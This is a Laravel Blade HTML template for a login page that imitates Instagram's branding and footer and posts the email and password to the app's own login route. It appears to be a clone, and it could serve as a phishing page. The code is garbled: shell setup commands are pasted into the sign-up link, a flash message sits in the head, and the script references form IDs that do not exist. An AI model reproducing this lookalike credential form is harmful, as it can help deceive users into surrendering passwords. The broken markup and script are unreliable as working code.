<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
@if(session('success'))
    <div style="background: #16a34a; color: white; padding: 8px 12px; border-radius: 6px; text-align:center; margin-bottom:12px;">
        {{ session('success') }}
    </div>
@endif


    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #000;
            color: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .main-container {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            gap: 80px;
        }

        .left-section {
            position: relative;
            width: 500px;
            height: 600px;
        }

        .phone-mockup {
            position: relative;
            width: 380px;
            height: 600px;
            background: #000;
            border-radius: 30px;
            margin: 0 auto;
            padding: 15px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
        }

       .phone-content {
    position: relative;
    width: 100%;
    height: 100%;
    border-radius: 20px;
    overflow: hidden;
    background-color: #000; /* change to any color you want */
}

          
        

        .main-image {
            width: 100%;
            height: 100%;
            object-fit: contain;
            border-radius: 20px;
            transition: transform 0.3s ease;
            display: block;
        }

        .reaction-bubble {
            position: absolute;
            background: white;
            padding: 12px 20px;
            border-radius: 20px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            display: flex;
            align-items: center;
            gap: 8px;
            z-index: 2;
        }

        .emoji-group {
            position: absolute;
            top: -1px;
            right: -500 px;
            background: white;
            padding: 5px;
            border-radius: 30px;
            display: flex;
            gap: 5px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            z-index: 3;
        }

        .like-bubble {
            position: absolute;
            bottom: 10px;
            right: 50px;
            background: #22c55e;
            color: white;
            padding: 8px 15px;
            border-radius: 15px;
            font-size: 14px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            z-index: 3;
        }

        .heart-animation {
            position: absolute;
            right: -1px;
            bottom:     100px;
            font-size: 40px;
            animation: floatHeart 3s ease-in-out infinite;
            z-index: 2;
        }

        /* Floating reaction elements */
        .reaction {
            position: absolute;
            font-size: 24px;
            animation: float 3s ease-in-out infinite;
            z-index: 10;
        }

        .reaction-heart {
            top: 80px;
            left: -20px;
            color: #ff3040;
            animation-delay: 0s;
        }

        .reaction-fire {
            top: 120px;
            left: 30px;
            color: #ff6b00;
            animation-delay: 1s;
        }

        .reaction-like {
            top: 200px;
            right: -30px;
            color: #8a2be2;
            animation-delay: 2s;
        }

        .reaction-star {
            bottom: 150px;
            right: 20px;
            color: #00ff41;
            animation-delay: 0.5s;
        }

        .reaction-bubble {
            top: 300px;
            left: -40px;
            background: #fff;
            color: #000;
            padding: 8px 12px;
            border-radius: 20px;
            font-size: 14px;
            animation-delay: 1.5s;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0px) rotate(0deg); opacity: 0.8; }
            50% { transform: translateY(-20px) rotate(5deg); opacity: 1; }
        }

        @keyframes floatHeart {
            0%, 100% { transform: translateY(0) scale(1); }
            50% { transform: translateY(-30px) scale(1.1); }
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }

        .right-section {
            width: 350px;
        }

        .instagram-logo {
            font-family: 'Billabong', cursive;
            font-size: 48px;
            text-align: center;
            margin-bottom: 40px;
            font-weight: normal;
            letter-spacing: 2px;
        }

        .login-form {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .input-field {
            background: #121212;
            border: 1px solid #333;
            border-radius: 6px;
            padding: 14px 12px;
            color: #fff;
            font-size: 14px;
            outline: none;
            transition: border-color 0.2s;
        }

        .input-field:focus {
            border-color: #555;
        }

        .input-field::placeholder {
            color: #8e8e8e;
        }

        .login-btn {
            background: #0095f6;
            color: #fff;
            border: none;
            border-radius: 6px;
            padding: 14px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 10px;
        }

        .login-btn:hover {
            background: #1877f2;
        }

        .login-btn:disabled {
            background: #4285f4;
            opacity: 0.6;
            cursor: not-allowed;
        }

        .divider {
            text-align: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .facebook-login {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #385185;
            text-decoration: none;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 20px;
            transition: color 0.2s;
        }

        .facebook-login:hover {
            color: #4267b2;
        }

        .forgot-password {
            text-align: center;
            color: #00376b;
            text-decoration: none;
            font-size: 12px;
            margin-bottom: 30px;
        }

        .forgot-password:hover {
            color: #0095f6;
        }

        .signup-link {
            text-align: center;
            color: #8e8e8e;
            font-size: 14px;
        }

    

        .footer {
            background: #000;
            padding: 20px;
            border-top: 1px solid #333;
        }

        .footer-links {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 15px;
            flex-wrap: wrap;
        }

        .footer-links a {
            color: #737373;
            text-decoration: none;
            font-size: 12px;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        .footer-bottom {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 20px;
            color: #737373;
            font-size: 12px;
        }

        .language-selector {
            background: transparent;
            border: none;
            color: #737373;
            font-size: 12px;
            cursor: pointer;
        }

        @media (max-width: 768px) {
            .main-container {
                flex-direction: column;
                gap: 40px;
            }

            .left-section {
                width: 300px;
                height: 400px;
            }

            .phone-mockup {
                width: 280px;
                height: 380px;
            }

            .right-section {
                width: 100%;
                max-width: 350px;
            }

            .footer-links {
                gap: 15px;
            }

            .footer-bottom {
                flex-direction: column;
                gap: 10px;
            }
        }

        /* Custom scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
        }

        ::-webkit-scrollbar-track {
            background: #000;
        }

        ::-webkit-scrollbar-thumb {
            background: #333;
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: #555;
        }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="left-section">
            <div class="phone-mockup">
                <div class="phone-content">
                  <img src="{{ asset('landing-3x.png') }}" alt="Landing image" class="main-image">


                    
                    <!-- Floating elements -->
                    <div class="emoji-group">
                        <span>🔥</span>
                        <span>💎</span>
                        <span>�</span>
                    </div>
                    
                    <div class="like-bubble">
                        <span>✨</span>
                    </div>
                    
                    <div class="heart-animation">
                        ❤️
                    </div>
                </div>
            </div>
        </div>

        <div class="right-section">
            <h1 class="instagram-logo">Instagram</h1>
            
<form class="login-form" method="POST" action="{{ route('login') }}">
    @csrf
    <input 
        type="email" 
        class="input-field" 
        placeholder="Email"
        name="email"
        required
    />
    <input 
        type="password" 
        class="input-field" 
        placeholder="Password"
        name="password"
        required
    />
    <button type="submit" class="login-btn">Log in</button>
</form>


            <div class="divider">OR</div>

            <a href="#" class="facebook-login" id="facebookLogin">
                <i class="fab fa-facebook-square" style="font-size: 18px;"></i>
                Log in with Facebook
            </a>

            <a href="#" class="forgot-password">Forgot password?</a>

            <div class="signup-link">
                Don't have an account?                 composer install
                php artisan key:generate>Sign up</a>
            </div>
        </div>
    </div>

    <footer class="footer">
        <div class="footer-links">
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Meta AI</a>
            <a href="#">Meta AI Articles</a>
            <a href="#">Threads</a>
            <a href="#">Contact Uploading & Non-Users</a>
            <a href="#">Meta Verified</a>
        </div>
        <div class="footer-bottom">
            <select class="language-selector">
                <option>English</option>
                <option>Español</option>
                <option>Français</option>
                <option>Deutsch</option>
                <option>Italiano</option>
            </select>
            <span>© 2025 Instagram from Meta</span>
        </div>
    </footer>

    <script>
        // Form validation and interaction
        const loginForm = document.getElementById('loginForm');
        const loginBtn = document.getElementById('loginBtn');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');

        // Enable/disable login button based on input
        function toggleLoginButton() {
            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();
            
            loginBtn.disabled = !(username && password);
        }

        usernameInput.addEventListener('input', toggleLoginButton);
        passwordInput.addEventListener('input', toggleLoginButton);

        // Handle form submission
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();
            
            if (!username || !password) {
                alert('Please fill in all fields');
                return;
            }

            // Simulate login process
            loginBtn.textContent = 'Logging in...';
            loginBtn.disabled = true;
            
            setTimeout(() => {
                alert('Login functionality would be implemented here');
                loginBtn.textContent = 'Log in';
                toggleLoginButton();
            }, 1500);
        });

        // Handle Facebook login
        document.getElementById('facebookLogin').addEventListener('click', function(e) {
            e.preventDefault();
            alert('Facebook login would be implemented here');
        });


        // Add some interactive hover effects
        const photoItems = document.querySelectorAll('.photo-item');
        photoItems.forEach(item => {
            item.addEventListener('mouseenter', function() {
                this.style.transform = 'scale(1.05)';
                this.style.transition = 'transform 0.3s ease';
            });
            
            item.addEventListener('mouseleave', function() {
                this.style.transform = 'scale(1)';
            });
        });

        // Animate reactions on page load
        function animateReactions() {
            const reactions = document.querySelectorAll('.reaction');
            reactions.forEach((reaction, index) => {
                setTimeout(() => {
                    reaction.style.opacity = '1';
                    reaction.style.animation = `float 3s ease-in-out infinite ${index * 0.5}s`;
                }, index * 500);
            });
        }

        // Initialize animations when page loads
        window.addEventListener('load', function() {
            animateReactions();
            toggleLoginButton(); // Initial state
        });

        // Add typing effect for placeholder text
        function addTypingEffect() {
            const inputs = document.querySelectorAll('.input-field');
            inputs.forEach(input => {
                input.addEventListener('focus', function() {
                    this.style.borderColor = '#0095f6';
                });
                
                input.addEventListener('blur', function() {
                    this.style.borderColor = '#333';
                });
            });
        }

        addTypingEffect();

        // Add subtle parallax effect to reactions
        window.addEventListener('mousemove', function(e) {
            const reactions = document.querySelectorAll('.reaction');
            const mouseX = e.clientX / window.innerWidth;
            const mouseY = e.clientY / window.innerHeight;
            
            reactions.forEach((reaction, index) => {
                const speed = (index + 1) * 0.5;
                const x = (mouseX - 0.5) * speed;
                const y = (mouseY - 0.5) * speed;
                
                reaction.style.transform = `translate(${x}px, ${y}px)`;
            });
        });
    </script>
</body>
</html>

